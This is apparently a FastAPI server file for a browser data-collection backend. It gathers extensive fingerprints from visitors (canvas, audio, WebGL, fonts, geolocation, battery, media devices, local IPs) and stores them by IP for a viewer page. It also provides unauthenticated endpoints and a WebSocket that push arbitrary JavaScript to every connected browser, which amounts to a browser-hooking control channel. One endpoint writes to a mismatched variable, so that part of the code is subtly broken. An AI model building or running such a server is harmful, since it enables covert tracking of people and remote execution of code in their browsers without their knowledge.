from fastapi import FastAPI, HTTPException , Request
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import Dict, Any, List, Optional
from datetime import datetime
import json
from fastapi import  WebSocket, WebSocketDisconnect

app = FastAPI()

# In-memory database organized by IP address
database: Dict[str, List[Dict]] = {}
#for storing custom JavaScript code
active_connections = set()
custom_js_code: str = ""
# Pydantic model to match frontend data structure
class BrowserData(BaseModel):
    meta: Dict[str, Any]
    basicinfo: Dict[str, Any]
    screeninfo: Dict[str, Any]
    browserinfo: Dict[str, Any]
    hardwareinfo: Dict[str, Any]
    networkinfo: Dict[str, Any]
    fontdetection: Any
    canvasfingerprint: Any
    webglinfo: Dict[str, Any]
    audiofingerprint: Any
    batteryinfo: Dict[str, Any]
    geolocation: Dict[str, Any]
    mediadevices: Any
    permissions: Dict[str, Any]
    storageinfo: Dict[str, Any]
    cpubenchmark: Dict[str, Any]
    localips: Any
    fingerprintjs: Dict[str, Any]

class BroadcastCodeRequest(BaseModel):
    code: str

# Endpoint to receive data from client
@app.post("/collect")
async def collect(data: BrowserData):
    entry = data.dict()
    entry["server_received_time"] = datetime.utcnow().isoformat()
    
    # Use the first IP address as the key (or "unknown" if not available)
    ip_address = entry.get("localips", ["unknown"])[0]
    
    # Initialize the list for this IP if it doesn't exist
    if ip_address not in database:
        database[ip_address] = []
    
    # Add the entry to the database under the IP key
    database[ip_address].append(entry)
    
    return {"status": "success", "count": len(database[ip_address])}

# Endpoint to serve the viewer HTML
@app.get("/view", response_class=HTMLResponse)
async def view():
    return FileResponse("app/static/view.html")

# Endpoint to return JSON data for viewer (optionally filtered by IP)
@app.get("/data")
async def get_data(ip: Optional[str] = None):
    if ip:
        # Return data for the specified IP
        if ip in database:
            return JSONResponse(content=database[ip])
        else:
            return JSONResponse(content=[], status_code=404)
    else:
        # Return all data (flatten the dictionary into a list)
        all_data = []
        for entries in database.values():
            all_data.extend(entries)
        return JSONResponse(content=all_data)

# Endpoint to delete entries for a specific IP or sessionID
@app.delete("/delete")
async def delete_entry(ip: Optional[str] = None, sessionID: Optional[str] = None):
    if ip:
        # Delete all entries for the specified IP
        if ip in database:
            deleted_count = len(database[ip])
            del database[ip]
            return {"status": "success", "deleted": deleted_count}
        else:
            raise HTTPException(status_code=404, detail="IP not found")
    elif sessionID:
        # Delete the entry with the specified sessionID
        deleted = False
        for ip_key in list(database.keys()):
            for idx, entry in enumerate(database[ip_key]):
                if entry["meta"]["sessionID"] == sessionID:
                    database[ip_key].pop(idx)
                    deleted = True
                    # Remove the IP key if no entries remain
                    if not database[ip_key]:
                        del database[ip_key]
                    break
            if deleted:
                break
        if deleted:
            return {"status": "success", "deleted": 1}
        else:
            raise HTTPException(status_code=404, detail="SessionID not found")
    else:
        raise HTTPException(status_code=400, detail="Must provide 'ip' or 'sessionID'")

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    active_connections.add(websocket)
    try:
        # Send the latest code immediately on connection
        if custom_js_code:
            await websocket.send_text(json.dumps({"type": "code", "data": custom_js_code}))
        # Keep connection alive (optional: handle incoming messages)
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        active_connections.remove(websocket)

@app.post("/broadcast-code")
async def broadcast_code(request: BroadcastCodeRequest):
    global latest_js_code
    latest_js_code = request.code
    for connection in active_connections:
        await connection.send_text(json.dumps({"type": "code", "data": request.code}))
    return {"status": "success"}

@app.post("/set-custom-js")
async def set_custom_js(request: Request):
    global custom_js_code
    data = await request.json()
    custom_js_code = data.get("code", "")
    return {"status": "success"}

# Endpoint to fetch custom JS code for the frontend
@app.get("/get-custom-js")
async def get_custom_js():
    return {"code": custom_js_code}

# Mount static assets (HTML)
app.mount("/", StaticFiles(directory="app/static", html=True), name="static")

# Mount JS separately
app.mount("/js", StaticFiles(directory="app/static"), name="js")
